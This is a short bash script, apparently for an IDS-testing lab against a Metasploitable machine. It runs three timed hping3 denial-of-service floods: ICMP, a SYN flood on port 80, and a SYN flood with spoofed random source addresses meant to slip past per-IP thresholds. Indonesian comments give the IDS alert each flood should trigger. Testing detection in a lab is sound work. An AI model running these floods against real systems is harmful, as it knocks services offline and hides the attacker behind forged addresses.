#!/bin/bash

# =================================================================
# SKENARIO 03: DENIAL OF SERVICE (DoS) - HPING3
# Strategi: 3 Level Depth (Volumetric, Protocol, Randomized)
# Catatan: Menggunakan 'timeout' agar script tidak looping selamanya.
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
LOG_FILE="logs/dos_session_$(date +%F).log"

echo "[+] [03_DOS] Memulai Skenario Denial of Service..."
echo "[+] Target: $TARGET_IP"
echo "[+] Waktu Mulai: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: ICMP FLOOD (Smurf / Ping Flood)
# Tujuan: Menguji deteksi Volumetric Attack (Banjir Bandwidth).
# Teknik: Mengirim paket ICMP (-1) secepat mungkin (--flood).
# Durasi: 30 Detik.
# -----------------------------------------------------------------
echo "[Level 1] Running ICMP Flood (30 Detik)..."
# Merekam statistik awal sebelum diserang (opsional, untuk validasi)
echo "Start ICMP Flood: $(date)" >> logs/dos_lvl1.txt
# Jalankan hping3 selama 30 detik, output dibuang agar tidak memenuhi layar
timeout 30 hping3 -1 --flood $TARGET_IP > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Alert GPL ICMP Large Packet / Stream anomaly)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: SYN FLOOD (TCP State Exhaustion)
# Tujuan: Menghabiskan resource CPU/RAM target (bukan bandwidth).
# Teknik: Mengirim Flag SYN (-S) ke port 80 (-p 80) tanpa ACK.
# Durasi: 30 Detik.
# -----------------------------------------------------------------
echo "[Level 2] Running SYN Flood Port 80 (30 Detik)..."
echo "Start SYN Flood: $(date)" >> logs/dos_lvl2.txt
timeout 30 hping3 -S -p 80 --flood $TARGET_IP > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Alert ET DOS Potential SYN Flood)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: RANDOM SOURCE ATTACK (DDoS Simulation)
# Tujuan: Mengelabui Rule "Threshold per IP".
# Teknik: Menggunakan IP Palsu Acak (--rand-source). 
#         IDS akan melihat ribuan IP berbeda menyerang, bukan 1 IP.
# Durasi: 30 Detik.
# -----------------------------------------------------------------
echo "[Level 3] Running Random Source Flood (--rand-source)..."
echo "Start DDoS Sim: $(date)" >> logs/dos_lvl3.txt
# Hati-hati: --rand-source bisa membuat router lokal bingung
timeout 30s hping3 -S -p 80 --flood --rand-source $TARGET_IP > /dev/null 2>&1
echo "    -> Selesai. (Harapan: Menguji Global Threshold IDS)"

echo "[+] [03_DOS] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"
